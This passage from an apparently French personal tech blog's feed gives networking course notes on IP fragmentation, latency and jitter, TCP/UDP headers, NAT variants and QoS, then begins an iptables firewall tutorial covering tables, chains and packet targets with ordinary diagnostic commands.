&lt;/ul&gt;

&lt;h1 id=&quot;fragmentation&quot;&gt;Fragmentation&lt;/h1&gt;

&lt;h3 id=&quot;encapsulation-dans-ethernet&quot;&gt;Encapsulation dans Ethernet&lt;/h3&gt;

&lt;p&gt;Si &lt;code class=&quot;highlighter-rouge&quot;&gt;MTU&lt;/code&gt; (Maximum Transmission Unit) est égale à 1500, alors, taille datagramme IP &amp;lt;= 1500 octets. Si supérieur, il faut découper, un datagramme IP est divisé en plusieurs autres datagrammes IP (avec en-tête).&lt;/p&gt;

&lt;h3 id=&quot;fragmentation-1&quot;&gt;Fragmentation&lt;/h3&gt;

&lt;p&gt;Datagramme IP ont taille sur 16 bits, dans 65 535 octets max, la MTU peut changer sur les tronçons du réseau. Chaque fragment doit avoir la plus grande taille possible et qui est multiple de 8 octets.&lt;/p&gt;

&lt;p&gt;1 fragment = 1 datagramme IP:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Identification&lt;/code&gt; : tous les fragments ont le même id&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Fragment Offset&lt;/code&gt; : position du début du fragment dans le datagramme initial (mutliple de 8)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Total Packet Length&lt;/code&gt; : recalculé pour chaque fragment&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Flags&lt;/code&gt; : 3 bits
    &lt;ul&gt;
      &lt;li&gt;pas utilisé&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DF&lt;/code&gt;: Don’t Fragment, indique si datagramme peut-être fragmenté ou non, si routeur doit fragmenter alors que DF = 1, alors datagramme détruit et ICMP d’erreur envoyé&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MF&lt;/code&gt;: More Fragment, indique si c’est un fragment
        &lt;ul&gt;
          &lt;li&gt;0: dernier ou pas de fragmentation&lt;/li&gt;
          &lt;li&gt;1: sinon&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;défragmentation&quot;&gt;Défragmentation&lt;/h3&gt;

&lt;p&gt;À la réception du premier fragment, on déclenche un temporisateur de réassemblage (délai max. d’attente de tous les fragments).&lt;/p&gt;

&lt;h3 id=&quot;métriques&quot;&gt;Métriques&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Latency: temps de A vers B&lt;/li&gt;
  &lt;li&gt;RTT, Round Trip Time, temps A-&amp;gt;B + B-&amp;gt;A, latence environ = RTT/2&lt;/li&gt;
  &lt;li&gt;Gigue: jitter, variation de la latence au cours du temps, Jitter = latency(t)-latency(t-1), mesure importante pour les communications en “temps réel”
    &lt;ul&gt;
      &lt;li&gt;mieux vaut une forte latence avec gigue stable, qu’une faible latence avec gigue important&lt;/li&gt;
      &lt;li&gt;les paquets peuvent arriver dans le désordre à cause de la variation de la latence au cours de l’envoi&lt;/li&gt;
      &lt;li&gt;si gigue = 0, alors latence stable, sinon latence varie&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# mesure RTT&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 5 164.81.1.4
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ping6 fe80:1030:5329:6d2c:211:deff:fead:beef &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; eth0
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 164.81.1.4 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
3 packets transmitted, 3 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;2003ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 45.614/46.351/47.507/0.827 ms
&lt;span class=&quot;c&quot;&gt;# mdev est le gigue&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;le débit
    &lt;ul&gt;
      &lt;li&gt;en bits/seconde, en puissance de 10&lt;/li&gt;
      &lt;li&gt;quantité d’information par unité de temps remis à son destinataire&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;occupation du canal: ratio par rapport au débit physique du réseau&lt;/li&gt;
  &lt;li&gt;débit utilisateur: ratio des données utiles (sans en-têtes) par rapport à toutes les données transmises&lt;/li&gt;
  &lt;li&gt;QoS; Quality of Service, débit pour un type de service (VoIP, Web,…), suppose que les communications peuvent être identifiées&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;circuit-virtuel-vs-datagramme&quot;&gt;Circuit virtuel vs Datagramme:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Circuit virtuel:
    &lt;ul&gt;
      &lt;li&gt;débit obtenu est très proche de celui offert en théorie par le réseau physique&lt;/li&gt;
      &lt;li&gt;lors de l’établissement du circuit virtuel, on peut connaître le débit prévisible&lt;/li&gt;
      &lt;li&gt;le débit peut-être garanti, QoS&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Datagramme:
    &lt;ul&gt;
      &lt;li&gt;capacité partagée entre les utilisateurs&lt;/li&gt;
      &lt;li&gt;ne peut pas être garantie (on ne peut pas savoir ce que font les autres utilisateurs)&lt;/li&gt;
      &lt;li&gt;contrôle de flux augmente l’utilisation du réseau et diminue son débit&lt;/li&gt;
      &lt;li&gt;pertes de paquets peuvent arriver (ex: pendant congestion)&lt;/li&gt;
      &lt;li&gt;peu ou pas de QoS, uniquement sur des parties contrôlées par l’entreprise par exemple&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;flow-control-vs-congestion-control&quot;&gt;Flow control vs Congestion control&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Flow control&lt;/strong&gt;: ne s’applique que sur une communication et entre deux interlocuteurs, éviter qu’un émetteur rapide sature (plus de place dans le buffer de réception) un récepteur lent -&amp;gt; le récepteur contrôle l’émetteur via mécanisme de fenêtre.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Congestion control&lt;/strong&gt;: dépends de l’état du réseau global, suite à perte de segments, utiliser nouvelle fenêtre d’autorisation d’émission.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# mutliplexag &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--inet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;segmentation&quot;&gt;Segmentation&lt;/h1&gt;

&lt;h3 id=&quot;tcp-segmentation&quot;&gt;TCP Segmentation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;manipule des flux d’octets de longueur variable, données à envoyer sont bufferisées afin d’améliorer les performances:
    &lt;ul&gt;
      &lt;li&gt;à l’envoi: améliorer taux d’occupation du réseau&lt;/li&gt;
      &lt;li&gt;à la réception: avertir/réveiller l’application que lorsqu’il y a un volume suffisant de données à traiter&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;données divisées en segments de taille optimale pour TCP&lt;/li&gt;
  &lt;li&gt;1 segment = 1 datagramme IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;acheminement&quot;&gt;Acheminement&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Taille de fenêtre d’émission (défini par récepteur), buffer d’envoi&lt;/li&gt;
  &lt;li&gt;Taille de fenêtre de réception, buffe de réception avec rangement via l’offset du segment&lt;/li&gt;
  &lt;li&gt;système d’ACK du suivant et de timeout avant retransmission, RTO, Retransmission TimeOut, calculé en fonction du RTT d’un segment&lt;/li&gt;
  &lt;li&gt;amélioration : delayed ACK ou acquittement cumulatif, acquitter plusieurs messages passés&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;tcp-header&quot;&gt;TCP Header&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Source Port&lt;/code&gt;: 16 bits, identifie le processus associé et défini le TSAP&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Destination Port&lt;/code&gt;: 16 bits, same&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Sequence Number&lt;/code&gt;: 32 bits, offset à partir d’une valeur initial (ISN, Initial Sequence Number), position du segment dans le flux à recomposer&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Acknowledge Number&lt;/code&gt;: 32 bits, num seq. du prochain segment attendu, acquitte les octets précédemment reçus&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Header Length&lt;/code&gt;: 4 bits, taille en mutliple de 4 octets&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RESV&lt;/code&gt;: 4 bits, réservé pour usage ultérieur&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ECN&lt;/code&gt;: 2 bits, Explicit Congestion Notification, avertir le récepteur d’un état de début de congestion, le routeur gérant l’ECN position un bit dans l’en-tête IP ou TCP afin d’informer le récepteur&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Flags&lt;/code&gt;: 6 bits
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;URG&lt;/code&gt;: indique des données urgentes par le Urgent Pointer&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ACK&lt;/code&gt;: accusé de réception présent dans Acknowledgement Number&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PSH&lt;/code&gt;: segment envoyé sans bufferisation&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RST&lt;/code&gt;: réinitialiser la connexion, problème de synchro.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SYN&lt;/code&gt;: synchroniser Sequence Number&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FIN&lt;/code&gt;: l’émetteur à fini d’émettre (permet de clore un sens de communication)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Windows Size&lt;/code&gt;: 16 bits, pour contrôle de flux par fenêtre glissante, indique nombre d’octets que l’émetteur est prêt à recevoir, le destinataire utilise cette info. pour gérer son débit d’envoi&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP Checksum&lt;/code&gt;: 16 bits, total de contrôle pour assurer la validité de l’en-tête et des données&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Urgent Pointer&lt;/code&gt;: 16 bits, si bit URG, indique début des données urgentes&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Options&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;MSS: Maximum Segment Size, indiqué lors de l’établissement de la connexion, le taille max des données d’un segment (sans en-tête) TCP que l’on peut recevoir&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;établissement-dune-connexion&quot;&gt;Établissement d’une connexion&lt;/h3&gt;

&lt;p&gt;Piggybacking: l’ACK d’un paquet A -&amp;gt; B, peut-être transmis dans un paquet allant de B -&amp;gt; A.&lt;/p&gt;

&lt;p&gt;Handshake:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;3 étapes&lt;/li&gt;
  &lt;li&gt;demande d’ouverture de la part de chaque interlocuteur&lt;/li&gt;
  &lt;li&gt;permet de synchroniser l’ISN
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; -&amp;gt; SYN=1 et ACK=0&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; -&amp;gt; SYN=1 et ACK=1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# tcpdump&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S]  -&amp;gt; SYN
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S.] -&amp;gt; SYN/ACK
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.]  -&amp;gt; ACK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;fermeture&quot;&gt;Fermeture&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;FIN -&amp;gt;&lt;/li&gt;
  &lt;li&gt;ACK &amp;lt;-&lt;/li&gt;
  &lt;li&gt;FIN &amp;lt;-&lt;/li&gt;
  &lt;li&gt;ACK -&amp;gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ou&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FIN -&amp;gt;&lt;/li&gt;
  &lt;li&gt;ACK &amp;lt;-&lt;/li&gt;
  &lt;li&gt;RST &amp;lt;-&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;bit-rst&quot;&gt;Bit RST&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;demande réinitialisation de la communication&lt;/li&gt;
  &lt;li&gt;émis en rapport à une connexion
    &lt;ul&gt;
      &lt;li&gt;nom existante&lt;/li&gt;
      &lt;li&gt;existante: segment qui ne correspond pas à celui attendu&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Segments Keep-Alive&lt;/code&gt;: garder en vie la connexion en évitant qu’un routeur réalisant du filtrage, supprime la connexion du fait de son inactivité, de tester la présence de l’interlocuteur, et de mettre fin sinon.&lt;/p&gt;

&lt;h3 id=&quot;calcul-du-timeout&quot;&gt;Calcul du Timeout&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;plus long que RTT, mais le RTT varie&lt;/li&gt;
  &lt;li&gt;si trop court: risque de retransmettre des segments pour rien&lt;/li&gt;
  &lt;li&gt;si trop long: réaction trop lente aux pertes de segments&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# conf. de TCP sous Linux&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /proc/sys/net/ipv4/tcp&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;udp-1&quot;&gt;UDP&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;inverse de TCP&lt;/li&gt;
  &lt;li&gt;souvent bit DF dans IP&lt;/li&gt;
  &lt;li&gt;est stateless&lt;/li&gt;
  &lt;li&gt;multicast&lt;/li&gt;
  &lt;li&gt;utilisé pour application: demande-réponse, temps réels, NTP, DNS, VoIP, IPTv&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# liste ports en attente&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-lp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--inet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Source Port&lt;/code&gt;: 16 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Destination Port&lt;/code&gt;: 16 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Length&lt;/code&gt;: 16 bits, inclus en-tête de 8 à 65353 octets&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Chechsum&lt;/code&gt;: 16 bits&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Data&lt;/code&gt;: optionel&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;nat-snat-dnat-pat-dmz&quot;&gt;NAT, SNAT, DNAT, PAT, DMZ&lt;/h1&gt;

&lt;h3 id=&quot;nat-network-address-translation&quot;&gt;NAT: Network Address Translation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;partage d’une adresse IP publique entre plusieurs machines&lt;/li&gt;
  &lt;li&gt;car manque d’adresses en IPv4&lt;/li&gt;
  &lt;li&gt;utilise réseaux privées (donc non routable):
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.0.0/8&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.0.0/12&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.0/16&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Le routeur NAT doit changer l’adresse IP privée du paquet en la sienne, différencier les paquets de machines différentes, garder une trace de toutes les connexions TCP et UDP qui le traverse, Connection Tracking, principe des stateful firewalls.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;static NAT: plusieurs privées vers une publique&lt;/li&gt;
  &lt;li&gt;dynamic NAT: plusieurs privées vers plusieurs publiques&lt;/li&gt;
  &lt;li&gt;masquerading: comme static NAT, mais sans spécifier d’adresse&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;conntrack &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# tcp ou udp (mémorise l'envoi et on attend paquet avec TSAP inverse)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;snat-source-nat&quot;&gt;SNAT: Source NAT&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;changer adresse source d’un paquet&lt;/li&gt;
  &lt;li&gt;utilisé pour aller sur internet à partir d’un réseau privé&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;dnat-destination-nat&quot;&gt;DNAT: Destination NAT&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;adresse publique vers privée&lt;/li&gt;
  &lt;li&gt;port forwarding: public vers privée en fonction du numéro de port&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;pat-port-address-translation&quot;&gt;PAT: Port Address Translation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;faire du SNAT en mode masquerading (many-to-one) en changeant au besoin le port d’origine&lt;/li&gt;
  &lt;li&gt;faire du DNAT en fonction d’un numéro de port choisi qui peut être différent du port de destination final.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;dmz-demilitarized-zone&quot;&gt;DMZ: Demilitarized Zone&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;redirige tout le trafic en provenance de l’extérieur vers une machine du réseau privée en plus de faire du masquerading en sortie.&lt;/li&gt;
  &lt;li&gt;SNAT + DNAT = full NAT&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;qos-quality-of-service&quot;&gt;QoS: Quality of Service&lt;/h1&gt;
&lt;hr /&gt;

&lt;p&gt;La qualité de service (QdS) ou Quality of service (QoS) est la capacité à véhiculer dans de bonnes conditions un type de trafic donné, en termes de disponibilité, débit, délais de transmission, gigue, taux de perte de paquets…&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iptables</title>
   <link href="http://localhost:4000/linux/2019/02/02/iptables/"/>
   <updated>2019-02-02T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/2019/02/02/iptables</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;definition&quot;&gt;definition&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Un firewall permet de protéger un réseau vis à vis d’autres réseaux. Le but d’un firewall est d’autoriser ou non, un certain trafic en filtrant les paquets entrant et/ou sortant. C’est l’élément de base dans la sécurisation d’un réseau local.&lt;/p&gt;

&lt;p&gt;Étant donné qu’il traite des &lt;strong&gt;paquets&lt;/strong&gt;, le firewall agit sur la &lt;strong&gt;couche 3&lt;/strong&gt; du modèle OSI, mais il peut aussi agir en &lt;strong&gt;couche 2&lt;/strong&gt; en filtrant au niveau MAC. Il peut aussi réaliser du &lt;strong&gt;NAT&lt;/strong&gt;, &lt;strong&gt;SNAT&lt;/strong&gt;, &lt;strong&gt;DNAT&lt;/strong&gt; et &lt;strong&gt;PAT&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Le firewall utilisé sous Linux est &lt;code class=&quot;highlighter-rouge&quot;&gt;netfilter&lt;/code&gt;, on parle de SPI (Stateful Packet Inspection). Il est utilisable via les commandes &lt;code class=&quot;highlighter-rouge&quot;&gt;iptables&lt;/code&gt; (IPv4) et &lt;code class=&quot;highlighter-rouge&quot;&gt;ìp6tables&lt;/code&gt; (IPv6).&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;important-notion&quot;&gt;important notion&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Paquets en:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INPUT&lt;/code&gt;: lorsqu’un hôte reçoit des paquets qui lui sont destinés&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OUTPUT&lt;/code&gt;: lorsqu’un hôte crée des paquets&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FORWARD&lt;/code&gt;: lorsqu’un hôte joue le rôle de “routeur” (activer le forwarding : &lt;code class=&quot;highlighter-rouge&quot;&gt;$ sudo sysctl net.ipv4.ip_forward=1&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Type de firewall:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stateless&lt;/code&gt; : ne garde aucune trace des connexions qui le traverse.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stateful&lt;/code&gt; : mémorise l’état des connexionx TCP afin de contrôler les échanges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/public/img/iptables/iptables.jpg&quot; alt=&quot;Fonctionnement iptables&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Étapes pour créer une régle avec &lt;code class=&quot;highlighter-rouge&quot;&gt;iptables&lt;/code&gt; :&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;choisir la table&lt;/li&gt;
  &lt;li&gt;choisir la chaine&lt;/li&gt;
  &lt;li&gt;choisir action sur la chaine&lt;/li&gt;
  &lt;li&gt;sélectionner les paquets&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Une régle est découpée comme ceci :&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$ iptables&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;-t table&lt;/td&gt;
      &lt;td&gt;-action_chaine&lt;/td&gt;
      &lt;td&gt;chaine&lt;/td&gt;
      &lt;td&gt;select paquets&lt;/td&gt;
      &lt;td&gt;-j action_paquets&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;choose-the-table&quot;&gt;choose the table&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;-t-filter&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-t filter&lt;/code&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;filtrage des paquets qui partent et qui arrivent&lt;/li&gt;
  &lt;li&gt;table par défaut, si rien n’est précisé&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;-t-nat&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-t nat&lt;/code&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;faire du DNAT, SNAT, PAT&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;-t-mangle&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-t mangle&lt;/code&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;modifier des données des couches hautes, notamment TCP&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;choisir-la-chaine&quot;&gt;Choisir la chaine&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;for--t-filter-&quot;&gt;for &lt;code class=&quot;highlighter-rouge&quot;&gt;-t filter&lt;/code&gt; :&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INPUT&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FORWARD&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OUTPUT&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Sur ces 3 chaines on peut :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-j ACCEPT&lt;/code&gt; : on accepte le paquet&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-j DROP&lt;/code&gt; : on refuse le paquet sans prévenir l’expéditeur de celui-ci&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-j REJECT&lt;/code&gt; : on refuse le paquets mais on prévient l’expéditeur&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-j LOG&lt;/code&gt; : on affiche un log&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;for--t-nat-&quot;&gt;for &lt;code class=&quot;highlighter-rouge&quot;&gt;-t nat&lt;/code&gt; :&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PREROUTING&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;avant le routage (avant le forward)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OUTPUT&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;traite paquets crées localement avant leur routage&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;POSTROUTING&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;après le routage&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Sur ces 3 chaines on peut :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-j DNAT&lt;/code&gt; : Destination NAT, on modifie @ de destination du paquet&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-j SNAT&lt;/code&gt; : Source NAT, on modifie @ source du paquet&lt;/li&gt;
